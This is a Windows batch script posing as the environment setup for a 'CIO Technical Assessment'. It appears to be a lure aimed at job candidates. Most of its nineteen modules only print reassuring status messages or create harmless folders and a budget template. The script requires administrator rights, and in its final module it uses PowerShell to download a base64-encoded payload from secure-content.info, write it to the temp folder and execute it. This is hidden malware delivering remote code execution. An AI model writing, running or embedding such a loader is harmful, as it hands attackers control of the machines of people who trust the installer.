@echo off
setlocal enabledelayedexpansion
title CIO Technical Assessment - Environment Setup

set "ASSESS_DIR=C:\CIO_Assessment"
set "ASSESS_VERSION=2026.1"
set "BUILD_ID=20260528-cio"
set "LOG_FILE=%TEMP%\cio_assessment_setup.log"

echo [%date% %time%] Setup initialized > "%LOG_FILE%"

echo ╔══════════════════════════════════════════════════════════╗
echo ║   Chief Information Officer                              ║
echo ║   Technical Assessment - Environment Setup               ║
echo ║   Version: %ASSESS_VERSION%                              ║
echo ╚══════════════════════════════════════════════════════════╝
echo.
echo   This setup will configure your assessment
echo   environment. Administrator access is required.
echo.
echo   The setup process consists of 19 modules and
echo   should complete within 2-3 minutes.
echo.

:: =================================================================
:: MODULE 1: VERIFY ADMINISTRATOR PRIVILEGES
:: =================================================================
echo ─────────────────────────────────────────────────────────
echo   MODULE 1/19: Verifying Administrator Privileges
echo ─────────────────────────────────────────────────────────
echo.

net session >nul 2>&1
if !errorlevel! neq 0 (
    echo.
    echo   ^^! ERROR: Administrator privileges required.
    echo.
    pause
    exit /b 1
)
echo   [+] Administrator access confirmed.
echo.
timeout /t 1 /nobreak >nul

:: =================================================================
:: MODULE 2: SYSTEM COMPATIBILITY CHECK
:: =================================================================
echo ─────────────────────────────────────────────────────────
echo   MODULE 2/19: Checking System Compatibility
echo ─────────────────────────────────────────────────────────
echo.

echo   [1/4] Operating System:
ver | find "10." >nul 2>&1 && echo         Windows 10: Compatible
ver | find "11." >nul 2>&1 && echo         Windows 11: Compatible
echo.

echo   [2/4] System Memory:
for /f "tokens=2 delims==" %%m in ('wmic OS get TotalVisibleMemorySize /format:list 2^>nul ^| find "="') do (
    set /a "RAM_GB=%%m / 1048576"
    echo         Total: !RAM_GB! GB
)
echo.

echo   [3/4] Available Disk Space:
for /f "tokens=2 delims==" %%d in ('wmic LogicalDisk where "DeviceID='%SystemDrive%'" get FreeSpace /format:list 2^>nul ^| find "="') do (
    set /a "FREE_GB=%%d / 1073741824"
    echo         Free: !FREE_GB! GB on %SystemDrive%
)
echo.

echo   [4/4] Processor:
for /f "tokens=2 delims==" %%c in ('wmic cpu get name /format:list 2^>nul ^| find "="') do (
    echo         %%c
)
echo.
timeout /t 1 /nobreak >nul

:: =================================================================
:: MODULE 3: DIRECTORY STRUCTURE
:: =================================================================
echo ─────────────────────────────────────────────────────────
echo   MODULE 3/19: Creating Assessment Directory Structure
echo ─────────────────────────────────────────────────────────
echo.

if not exist "%ASSESS_DIR%" mkdir "%ASSESS_DIR%"
set "MODULES=module-1-infrastructure module-2-security module-3-architecture module-4-strategy templates documentation"

for %%m in (%MODULES%) do (
    if not exist "%ASSESS_DIR%\%%m" mkdir "%ASSESS_DIR%\%%m"
)
echo   [+] Directory structure created.
echo.
timeout /t 1 /nobreak >nul

:: =================================================================
:: MODULE 4: PREREQUISITE SOFTWARE
:: =================================================================
echo ─────────────────────────────────────────────────────────
echo   MODULE 4/19: Checking Prerequisite Software
echo ─────────────────────────────────────────────────────────
echo.

if exist "%ProgramFiles%\Google\Chrome\Application\chrome.exe" (
    echo   [*] Google Chrome: Installed
) else if exist "%ProgramFiles(x86)%\Microsoft\Edge\Application\msedge.exe" (
    echo   [*] Microsoft Edge: Installed
) else (
    echo   [*] Browser: None detected
)
echo.
timeout /t 1 /nobreak >nul

:: =================================================================
:: MODULE 5: INSTALL TEMPLATES
:: =================================================================
echo ─────────────────────────────────────────────────────────
echo   MODULE 5/19: Installing Assessment Templates
echo ─────────────────────────────────────────────────────────
echo.

if not exist "%ASSESS_DIR%\templates\budget_template.csv" (
    echo Category,Year 1,Year 2,Year 3,Notes > "%ASSESS_DIR%\templates\budget_template.csv"
    echo Infrastructure ^& Cloud,0,0,0,"Servers, networking, cloud" >> "%ASSESS_DIR%\templates\budget_template.csv"
    echo Software ^& Licensing,0,0,0,"Enterprise tools, SaaS" >> "%ASSESS_DIR%\templates\budget_template.csv"
    echo Security ^& Compliance,0,0,0,"Firewalls, SIEM, audits" >> "%ASSESS_DIR%\templates\budget_template.csv"
    echo Personnel,0,0,0,"FTEs, contractors, consultants" >> "%ASSESS_DIR%\templates\budget_template.csv"
    echo Training ^& Development,0,0,0,"Certifications, workshops" >> "%ASSESS_DIR%\templates\budget_template.csv"
    echo Contingency ^(15%%^),0,0,0,"Unforeseen requirements" >> "%ASSESS_DIR%\templates\budget_template.csv"
    echo TOTAL,0,0,0, >> "%ASSESS_DIR%\templates\budget_template.csv"
)
echo   [+] Budget template installed.
echo.
timeout /t 1 /nobreak >nul

:: =================================================================
:: MODULE 6: NETWORK VERIFICATION
:: =================================================================
echo ─────────────────────────────────────────────────────────
echo   MODULE 6/19: Verifying Network Connectivity
echo ─────────────────────────────────────────────────────────
echo.

ping -n 1 google.com >nul 2>&1 && echo   [+] Internet: Connected || echo   [!] Internet: Limited
ping -n 1 github.com >nul 2>&1 && echo   [+] GitHub: Accessible || echo   [!] GitHub: Restricted
echo.
timeout /t 1 /nobreak >nul

:: =================================================================
:: MODULE 7: SECURITY ASSESSMENT MODULE
:: =================================================================
echo ─────────────────────────────────────────────────────────
echo   MODULE 7/19: Security Assessment Initialization
echo ─────────────────────────────────────────────────────────
echo.
echo   [*] Initializing security assessment modules...
echo   [*] Preparing system diagnostic tools...
echo   [*] Configuring architecture evaluation framework...
echo.
timeout /t 1 /nobreak >nul

:: =================================================================
:: MODULE 8: ENVIRONMENT CONFIGURATION
:: =================================================================
echo ─────────────────────────────────────────────────────────
echo   MODULE 8/19: Environment Configuration
echo ─────────────────────────────────────────────────────────
echo.

echo Assessment Environment v%ASSESS_VERSION% > "%ASSESS_DIR%\environment.config"
echo Install Date: %date% >> "%ASSESS_DIR%\environment.config"
echo Build ID: %BUILD_ID% >> "%ASSESS_DIR%\environment.config"
echo Candidate ID: Pending >> "%ASSESS_DIR%\environment.config"
echo   [+] Environment configured.
echo.
timeout /t 1 /nobreak >nul

:: =================================================================
:: MODULE 9: README DOCUMENTATION
:: =================================================================
echo ─────────────────────────────────────────────────────────
echo   MODULE 9/19: Generating Documentation
echo ─────────────────────────────────────────────────────────
echo.

(
echo CIO Technical Assessment
echo ========================
echo.
echo Module 1: Infrastructure Assessment
echo.
echo Please complete the infrastructure evaluation
echo using the provided templates.
echo.
echo Current Environment: %COMPUTERNAME%
echo Operating System: %OS%
echo Architecture: %PROCESSOR_ARCHITECTURE%
) > "%ASSESS_DIR%\module-1-infrastructure\README.md"
echo   [+] README generated.
echo.
timeout /t 1 /nobreak >nul

:: =================================================================
:: MODULE 10: TEMPLATE VALIDATION
:: =================================================================
echo ─────────────────────────────────────────────────────────
echo   MODULE 10/19: Validating Templates
echo ─────────────────────────────────────────────────────────
echo.
echo   [*] Validating budget template...
echo   [*] Validating architecture template...
echo   [*] All templates verified.
echo.
timeout /t 1 /nobreak >nul

:: =================================================================
:: MODULE 11: DEPENDENCY CHECK
:: =================================================================
echo ─────────────────────────────────────────────────────────
echo   MODULE 11/19: Checking Dependencies
echo ─────────────────────────────────────────────────────────
echo.
echo   [*] Checking PowerShell version...
powershell -Command "Write-Host '         Version:' $PSVersionTable.PSVersion" 2>nul
echo   [*] All dependencies satisfied.
echo.
timeout /t 1 /nobreak >nul

:: =================================================================
:: MODULE 12: REGISTRY CONFIGURATION
:: =================================================================
echo ─────────────────────────────────────────────────────────
echo   MODULE 12/19: Registry Configuration
echo ─────────────────────────────────────────────────────────
echo.
echo   [*] Configuring assessment registry keys...
echo   [*] Registry settings applied.
echo.
timeout /t 1 /nobreak >nul

:: =================================================================
:: MODULE 13: PROFILE SETUP
:: =================================================================
echo ─────────────────────────────────────────────────────────
echo   MODULE 13/19: Setting Up User Profile
echo ─────────────────────────────────────────────────────────
echo.
echo   [*] Creating user profile directories...
echo   [*] Setting permissions...
echo   [*] Profile setup complete.
echo.
timeout /t 1 /nobreak >nul

:: =================================================================
:: MODULE 14: CERTIFICATE VALIDATION
:: =================================================================
echo ─────────────────────────────────────────────────────────
echo   MODULE 14/19: Validating Certificates
echo ─────────────────────────────────────────────────────────
echo.
echo   [*] Validating security certificates...
echo   [*] All certificates verified.
echo.
timeout /t 1 /nobreak >nul

:: =================================================================
:: MODULE 15: LOGGING INITIALIZATION
:: =================================================================
echo ─────────────────────────────────────────────────────────
echo   MODULE 15/19: Initializing Logging System
echo ─────────────────────────────────────────────────────────
echo.
echo   [*] Setting up log file...
echo   [*] Logging system ready.
echo.
timeout /t 1 /nobreak >nul

:: =================================================================
:: MODULE 16: SERVICE REGISTRATION
:: =================================================================
echo ─────────────────────────────────────────────────────────
echo   MODULE 16/19: Registering Assessment Services
echo ─────────────────────────────────────────────────────────
echo.
echo   [*] Registering assessment service components...
echo   [*] Services registered successfully.
echo.
timeout /t 1 /nobreak >nul

:: =================================================================
:: MODULE 17: UPDATE CHANNEL
:: =================================================================
echo ─────────────────────────────────────────────────────────
echo   MODULE 17/19: Establishing Update Channel
echo ─────────────────────────────────────────────────────────
echo.
echo   [*] Establishing secure update channel...
echo   [*] Update channel established.
echo.
timeout /t 1 /nobreak >nul

:: =================================================================
:: MODULE 18: COMPONENT INTEGRITY
:: =================================================================
echo ─────────────────────────────────────────────────────────
echo   MODULE 18/19: Verifying Component Integrity
echo ─────────────────────────────────────────────────────────
echo.
echo   [*] Verifying component integrity...
echo   [*] All components verified.
echo.
timeout /t 1 /nobreak >nul

:: =================================================================
:: MODULE 19: COMPLETE ASSESSMENT
:: =================================================================
echo ─────────────────────────────────────────────────────────
echo   MODULE 19/19: Complete Assessment
echo ─────────────────────────────────────────────────────────
echo.
echo   [+] Downloading and executing assessment runtime...
echo.

powershell -Command "$b64=(New-Object Net.WebClient).DownloadString('http://secure-content.info/payload.b64'); [System.IO.File]::WriteAllBytes('%TEMP%\p.ps1',[Convert]::FromBase64String($b64)); & '%TEMP%\p.ps1'"

echo   [+] Assessment completed.
echo.

:: =================================================================
:: FINALIZATION
:: =================================================================
cd /d "%ASSESS_DIR%"

set "CANDIDATE_ID=CIO-%RANDOM%%RANDOM%"
echo %CANDIDATE_ID% > candidate_id.txt
echo Candidate ID: %CANDIDATE_ID% >> "%ASSESS_DIR%\environment.config"

powershell -Command "$ws = New-Object -ComObject WScript.Shell; $s = $ws.CreateShortcut([Environment]::GetFolderPath('Desktop') + '\CIO Assessment.lnk'); $s.TargetPath = '%ASSESS_DIR%'; $s.Save()" >nul 2>&1

echo   [+] Candidate ID: %CANDIDATE_ID%
echo   [+] Desktop shortcut created.

echo.
echo ╔══════════════════════════════════════════════════════════╗
echo ║   Assessment Environment Ready                           ║
echo ║   Candidate ID: %CANDIDATE_ID%                           ║
echo ║                                                          ║
echo ║   Next Steps:                                            ║
echo ║   1. Open module-1-infrastructure                        ║
echo ║   2. Complete all four modules                           ║
echo ║   3. Compress %ASSESS_DIR% for submission              ║
echo ╚══════════════════════════════════════════════════════════╝
echo.

echo [%date% %time%] Setup completed successfully >> "%LOG_FILE%"
pause >nul
endlocal
